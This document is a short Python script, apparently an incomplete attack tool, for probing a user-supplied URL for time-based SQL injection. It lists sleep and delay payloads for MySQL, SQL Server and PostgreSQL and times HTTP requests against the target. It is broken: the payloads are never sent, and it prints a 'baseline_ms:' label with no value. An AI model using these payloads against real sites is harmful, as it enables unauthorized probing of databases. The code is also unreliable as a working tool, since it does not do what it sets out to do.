import urllib.request
import urllib.parse
import time
import sys

def measure_response_time(url):
    start_time = time.time()
    try:
        with urllib.request.urlopen(url, timeout=30) as response:
            response.read()
        end_time = time.time()
        return (end_time - start_time) * 1000
    except:
        end_time = time.time()
        return (end_time - start_time) * 1000

def main():
    url_template = input().strip()
    
    # Test payloads for time-based SQL injection
    payloads = [
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1; WAITFOR DELAY '00:00:05'--",
        "1' OR SLEEP(5)--",
        "1'; SELECT pg_sleep(5)--"
    ]
    
    # Measure baseline response time
    baseline_url = url_template.replace("{INJECT}", "1")
    baseline_ms = measure_response_time(baseline_url)
    
    print("baseline_ms:")

if __name__ == "__main__":
    main()